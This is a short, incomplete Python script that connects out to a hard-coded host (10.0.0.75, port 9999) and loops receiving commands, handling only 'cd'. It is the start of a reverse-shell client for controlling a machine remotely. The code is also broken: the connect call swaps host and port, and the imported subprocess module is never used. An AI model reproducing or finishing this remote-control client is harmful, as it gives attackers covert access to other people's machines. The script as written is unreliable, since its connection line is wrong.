import os
import socket
import subprocess



s = socket.socket()
host = '10.0.0.75'
port = 9999
s.connect((port, host))


while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

